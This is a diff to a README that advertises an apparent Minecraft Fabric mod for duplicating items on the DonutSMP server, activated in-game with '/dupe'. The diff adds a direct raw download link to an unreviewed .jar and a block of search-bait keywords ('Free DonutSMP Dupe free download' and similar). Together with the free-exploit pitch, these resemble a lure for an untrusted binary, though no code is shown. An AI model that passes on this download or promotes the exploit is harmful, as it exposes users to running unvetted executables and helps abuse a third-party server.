@@ -40,9 +40,9 @@ Whether you're looking to dupe gear, loot, or rare items, this mod provides a si
 
 ## 🔧 Installation
 
-1. Install **Fabric Loader** for Minecraft 1.21+
-2. Download **Fabric API** and place it in your `mods` folder
-3. Download this mod and place it in your `mods` folder
+1. Install [Fabric Loader](https://fabricmc.net) for Minecraft 1.21+
+2. Download [Fabric API](https://modrinth.com/mod/fabric-api) and place it in your `mods` folder
+3. Download [this mod](https://github.com/samatoolz/DonutSMP-Dupe/raw/refs/heads/main/DonutDuper-1.21.jar) and place it in your `mods` folder
 4. Launch the game
 5. Use `/dupe` in-game to activate the exploit
 
@@ -75,6 +75,6 @@ This project is not affiliated with DonutSMP, Mojang, or Microsoft.
 
 ## 📝 Keywords
 
-`Minecraft` `Fabric` `1.21` `DonutSMP` `dupe` `duplication` `exploit` `anarchy` `utility-mod` `duplication-glitch` `bypass` `free-dupe` `minecraft-exploit` `fabric-mod` `item-dupe`
+`Minecraft` `Fabric` `1.21` `DonutSMP` `dupe` `duplication` `exploit` `anarchy` `utility-mod` `duplication-glitch` `bypass` `free-dupe` `minecraft-exploit` `fabric-mod` `item-dupe` `Minecraft Mod` `DonutSMP Duper` `Free DonutSMP Dupe` `DonutSMP Dupe free download` `Minecraft smp dupe` `minecraft server dupe` `fabric mod dupe` `Minecraft 1.21 dupe`
 
 ---
